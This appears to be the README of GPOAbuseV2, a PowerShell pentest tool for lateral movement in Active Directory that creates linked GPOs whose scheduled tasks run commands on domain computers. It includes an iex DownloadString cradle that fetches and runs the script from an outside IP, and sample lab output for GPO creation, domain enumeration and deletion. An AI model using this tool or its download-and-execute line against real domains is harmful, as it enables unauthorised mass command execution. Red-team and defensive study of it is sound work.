# GPOAbuseV2
Lateralization in an Active Directory domain using GPO deployment with no GUI and no dependencies. You need to be Domain Admin or have the rights to create GPO.

## Acknowledgment
Many thanks to the tools [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse), [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) and [PowerGPOAbuse](https://github.com/rootSySdk/PowerGPOAbuse) and their authors for their previous research. GPOAbuseV2 is a combination of these tools.

## Deployment
```powershell
. .\GPOAbuseV2.ps1
Import-Module GPOAbuseV2.ps1
iex (new-object Net.WebClient).DownloadString('http://100.100.100.118:9000/GPOAbuseV2.ps1')
```
## Help
The tool is compatible with Get-Help.
Examples:
```powershell
PS> Get-Help Create
PS> Get-Help List -Full
PS> Get-Help Delete -Examples
```

## Functions
### Create
To create and deploy a GPO in the domain
```
PS> Create -Name "Ping_all_up_computers" -OU "OU=TKNX-Machines,DC=teknex,DC=lab" -Scope "Computers" -Command "ping.exe -n 1 100.100.100.118"

[INFO] GPO 'Ping_all_up_computers' created
[INFO] GPO linked to 'OU=TKNX-Machines,DC=teknex,DC=lab'
[INFO] Created file tree
[INFO] Created Scheduled Task file
[INFO] Created GPT file
[INFO] LDAP modified

---- GPO properly Created ----
  Name              :   Ping_all_up_computers
  GUID              :   6D185B93-2A6C-4F6D-8976-122B87CD68B6
  OU                :   OU=TKNX-Machines,DC=teknex,DC=lab
  Scope             :   Computers
  Command assigned  :   ping.exe -n 1 100.100.100.118
------------------------------
```

### List
To list objects of the domain
```
PS> List All

- Enabled Users are in the following OUs:
     + CN=Users,DC=teknex,DC=lab
     |   Mickey Mouse

     + OU=TKNX-Utilisateurs,DC=teknex,DC=lab
     |   Administrateur
     |   Minnie Mouse

     + OU=TKNX-Machines,DC=teknex,DC=lab
     |   Donald Duck


- Enabled Computers are in the following OUs:
    + OU=TKNX-Machines,DC=teknex,DC=lab
    |   CLI003          (100.100.100.122)
    |   CLI002          (100.100.100.121)
    |   CLI001          (100.100.100.120)

    + OU=Domain Controllers,DC=teknex,DC=lab
    |   DC01            (100.100.100.119)   [DC]


- GPO and where they're linked:
    +   Default Domain Policy
    |   DC=teknex,DC=lab

    +   Ping_all_up_computers
    |   OU=TKNX-Machines,DC=teknex,DC=lab

    +   Default Domain Controllers Policy
    |   OU=Domain Controllers,DC=teknex,DC=lab
```

### Delete
To delete a GPO
```
PS> Delete "Test GPO"

---- Deletion of the GPO ----
  Name   :   Test GPO
  Links  :   DC=teknex,DC=lab
-----------------------------                                                 
Are you sure to delete this GPO ? (Y/N) Y

GPO properly deleted
```
